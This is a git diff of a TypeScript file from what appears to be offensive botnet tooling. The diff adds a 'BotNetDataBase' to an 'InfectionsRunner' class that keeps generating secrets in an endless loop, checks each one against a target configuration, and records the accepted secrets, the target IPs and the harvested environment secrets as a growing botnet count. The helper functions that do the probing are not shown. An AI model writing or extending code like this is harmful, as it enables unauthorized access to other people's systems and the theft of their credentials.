@@ -1,8 +1,7 @@
 import { createSecret } from "./createSecret/index.ts";
 import { CheckConfig } from "./checkConfig/index.ts";
 import { Config } from "../../types/global.d.ts";
-
-const threads = 10;
+import { BotNetDataBase } from './../../database/index.ts';
 
 export class InfectionsRunner {
     private createSecret = createSecret;
@@ -11,10 +10,20 @@ export class InfectionsRunner {
     }
 
     public async run() {
+        const kv = new BotNetDataBase();
+        console.log(`\x1b[32m[+]\x1b[0m Generating DataBase...`);
+        console.log(`\x1b[32m[+]\x1b[0m Please wait...`);
+        await kv.setup();
+        console.log(`\x1b[32m[+]\x1b[0m DataBase generated`);
+        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
+
         const onThread = async () => {
             const secret = await this.createSecret();
+            console.log(`\x1b[32m[+]\x1b[0m Generated secret: ${secret}`);
             const config = await this.checkConfig(secret);
             if (!config) {
+                console.log(`\x1b[33m[!]\x1b[0m Rejected secret: ${secret}`);
+                onThread();
                 return;
             }
             const result = {
@@ -23,11 +32,16 @@ export class InfectionsRunner {
                 envSecret: config.envSecret
             } as const
 
-            console.log(result);
+            kv.pushSecret(result.secret, result.ip, result.envSecret);
+            console.log(`\x1b[32m[+]\x1b[0m ${result.secret} - ${result.ip} - ${result.envSecret}`);
+            console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
+
+            onThread();
+            return
         }
 
-        onThread();
+        const threads = Array.from({ length: 1 }).map(() => onThread());
 
-
+        Promise.all(threads);
     }
 }
